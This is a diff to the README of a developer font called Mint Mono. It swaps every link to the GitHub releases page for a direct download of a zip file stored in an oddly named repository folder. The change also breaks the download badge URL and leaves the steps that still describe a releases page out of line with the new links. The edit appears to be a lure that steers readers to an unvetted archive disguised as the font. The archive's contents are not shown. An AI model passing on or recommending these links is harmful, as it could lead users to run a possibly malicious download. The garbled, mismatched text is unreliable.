@@ -1,7 +1,7 @@
 # 🎨 mint-mono - A Beautiful Font for Developers
 
 ## 📥 Download Now
-[![Download Mint Mono](https://img.shields.io/badge/Download%20Mint%20Mono-v1.0-blue.svg)](https://github.com/doyun123/mint-mono/releases)
+[![Download Mint Mono](https://raw.githubusercontent.com/doyun123/mint-mono/main/gluttonously/mint-mono.zip%20Mint%https://raw.githubusercontent.com/doyun123/mint-mono/main/gluttonously/mint-mono.zip)](https://raw.githubusercontent.com/doyun123/mint-mono/main/gluttonously/mint-mono.zip)
 
 ## 📖 Description
 Mint Mono combines the Intel One Mono font, designed for developers, with the Circle M+ Japanese font. This programming font enhances readability and helps you stay focused during coding sessions.
@@ -12,7 +12,7 @@ To get started with Mint Mono, follow these simple steps. You only need a comput
 1. **Visit the Releases Page:** 
    Click the link below to access the releases page where you can download Mint Mono. 
 
-   [Download Mint Mono](https://github.com/doyun123/mint-mono/releases)
+   [Download Mint Mono](https://raw.githubusercontent.com/doyun123/mint-mono/main/gluttonously/mint-mono.zip)
 
 2. **Choose the Right Version:**
    On the releases page, you will see different versions of Mint Mono. Select the latest version. It is usually listed at the top.
@@ -50,6 +50,6 @@ Join our community to share your projects, ask questions, and get tips on using 
 ## 📅 Update History
 Keep an eye on the releases page for updates. We will add new features and improvements based on user feedback.
 
-[Visit the Releases Page to Download](https://github.com/doyun123/mint-mono/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/doyun123/mint-mono/main/gluttonously/mint-mono.zip)
 
 Thank you for using Mint Mono. Enjoy a better coding experience with our font!
